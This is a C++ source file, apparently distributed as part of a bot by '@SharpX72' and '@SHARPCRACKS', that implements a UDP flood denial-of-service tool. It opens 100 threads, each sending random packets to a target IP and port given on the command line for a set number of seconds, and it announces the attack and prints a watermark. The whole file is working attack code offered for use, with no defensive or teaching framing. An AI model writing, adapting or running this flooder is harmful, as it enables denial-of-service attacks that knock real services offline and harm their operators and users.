#include <iostream> // MADE BY @SharpX72
#include <thread> // MADE BY @SharpX72
#include <vector> // MADE BY @SharpX72
#include <atomic> // MADE BY @SharpX72
#include <cstring> // MADE BY @SharpX72
#include <cstdlib> // MADE BY @SharpX72
#include <ctime> // MADE BY @SharpX72
#include <csignal> // MADE BY @SharpX72
#include <netinet/in.h> // MADE BY @SharpX72
#include <arpa/inet.h> // MADE BY @SharpX72
#include <unistd.h> // MADE BY @SharpX72
#include <sys/socket.h> // MADE BY @SharpX72
#include <sys/types.h> // MADE BY @SharpX72
#include <sched.h> // MADE BY @SharpX72

#define PACKET_SIZE 15000 // MADE BY @SharpX72
#define PAYLOAD_SIZE 20 // MADE BY @SharpX72
#define DEFAULT_THREADS 100 // MADE BY @SharpX72

std::atomic<bool> attack_running(true); // MADE BY @SharpX72

// Function to generate random payload for the UDP packets // MADE BY @SharpX72
void generate_payload(char *buffer, size_t size) { // MADE BY @SharpX72
    for (size_t i = 0; i < size; i++) { // MADE BY @SharpX72
        buffer[i * 4] = '\\'; // MADE BY @SharpX72
        buffer[i * 4 + 1] = 'x'; // MADE BY @SharpX72
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16]; // MADE BY @SharpX72
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16]; // MADE BY @SharpX72
    } // MADE BY @SharpX72
    buffer[size * 4] = '\0'; // MADE BY @SharpX72
} // MADE BY @SharpX72

// Function to check expiration date (day, month, year) // MADE BY @SharpX72
bool is_expired() { // MADE BY @SharpX72
    // Define the expiration date // MADE BY @SharpX72
    int expire_day = 15; // MADE BY @SharpX72
    int expire_month = 11; // MADE BY @SharpX72
    int expire_year = 2024; // MADE BY @SharpX72

    // Get the current date // MADE BY @SharpX72
    time_t now = time(NULL); // MADE BY @SharpX72
    struct tm *current_time = localtime(&now); // MADE BY @SharpX72

    // Check if the current date is past the expiration date // MADE BY @SharpX72
    if ((current_time->tm_year + 1900 > expire_year) || // MADE BY @SharpX72
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 > expire_month) || // MADE BY @SharpX72
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 == expire_month && current_time->tm_mday > expire_day)) { // MADE BY @SharpX72
        return true; // MADE BY @SharpX72
    } // MADE BY @SharpX72

    return false; // MADE BY @SharpX72
} // MADE BY @SharpX72

// Function to perform the UDP flood attack // MADE BY @SharpX72
void udp_attack(const char *ip, int port, int attack_time) { // MADE BY @SharpX72
    struct sockaddr_in server_addr; // MADE BY @SharpX72
    int sock; // MADE BY @SharpX72
    char buffer[PAYLOAD_SIZE * 4 + 1]; // MADE BY @SharpX72

    // Create socket for UDP communication // MADE BY @SharpX72
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) { // MADE BY @SharpX72
        printf("Error: Could not create socket! Reason: %s\n", strerror(errno)); // MADE BY @SharpX72
        return; // MADE BY @SharpX72
    } // MADE BY @SharpX72

    // Set up server address structure // MADE BY @SharpX72
    server_addr.sin_family = AF_INET; // MADE BY @SharpX72
    server_addr.sin_port = htons(port); // MADE BY @SharpX72

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) { // MADE BY @SharpX72
        printf("Error: Invalid IP address - %s\n", ip); // MADE BY @SharpX72
        close(sock); // MADE BY @SharpX72
        return; // MADE BY @SharpX72
    } // MADE BY @SharpX72

    time_t start_time = time(NULL); // MADE BY @SharpX72
    while (time(NULL) - start_time < attack_time) { // MADE BY @SharpX72
        generate_payload(buffer, PAYLOAD_SIZE); // MADE BY @SharpX72

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) { // MADE BY @SharpX72
            printf("Error sending packet: %s\n", strerror(errno)); // MADE BY @SharpX72
        } // MADE BY @SharpX72
    } // MADE BY @SharpX72

    close(sock); // MADE BY @SharpX72
} // MADE BY @SharpX72

int main(int argc, char *argv[]) { // MADE BY @SharpX72
    if (argc != 4) { // MADE BY @SharpX72
        printf("Usage: %s <ip> <port> <time>\n", argv[0]); // MADE BY @SharpX72
        return 1; // MADE BY @SharpX72
    } // MADE BY @SharpX72

    const char *ip = argv[1]; // MADE BY @SharpX72
    int port = atoi(argv[2]); // MADE BY @SharpX72
    int duration = atoi(argv[3]); // MADE BY @SharpX72

    // Print info about the attack // MADE BY @SharpX72
    std::cout << "Flood started to " << ip << ":" << port << " with " << DEFAULT_THREADS << " Threads for time " << duration << " seconds." << std::endl; // MADE BY @SharpX72
    std::cout << "WATERMARK: THIS BOT PROVIDE BY @SHARPCRACKS\nTHIS BINARY BY @SharpX72" << std::endl; // MADE BY @SharpX72

    // Perform attack using threads // MADE BY @SharpX72
    std::vector<std::thread> threads; // MADE BY @SharpX72
    for (int i = 0; i < DEFAULT_THREADS; i++) { // MADE BY @SharpX72
        threads.push_back(std::thread(udp_attack, ip, port, duration)); // MADE BY @SharpX72
    } // MADE BY @SharpX72

    // Join all threads // MADE BY @SharpX72
    for (auto &t : threads) { // MADE BY @SharpX72
        t.join(); // MADE BY @SharpX72
    } // MADE BY @SharpX72

    return 0; // MADE BY @SharpX72
} // MADE BY @SharpX72
